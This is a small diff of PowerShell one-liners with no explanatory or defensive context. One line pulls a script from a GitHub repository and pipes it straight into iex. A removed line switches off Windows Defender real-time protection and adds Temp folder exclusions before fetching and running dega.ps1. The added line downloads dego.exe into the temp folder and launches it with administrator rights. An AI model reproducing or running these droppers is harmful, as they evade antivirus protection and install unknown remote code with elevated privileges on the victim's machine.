@@ -6,4 +6,4 @@ powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-c \"$E
 
 powershell -c "irm https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dega.ps1 | iex"
 
-powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -ExclusionPath 'C:\Windows\Temp'; Set-MpPreference -ExclusionPath $env:TEMP; $script = (New-Object Net.WebClient).DownloadString('https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dega.ps1'); iex $script; Set-MpPreference -DisableRealtimeMonitoring $false"
+iwr "https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dego.exe" -OutFile "$env:TEMP\dego.exe" -UseBasicParsing; Start-Process "$env:TEMP\dego.exe" -Verb RunAs
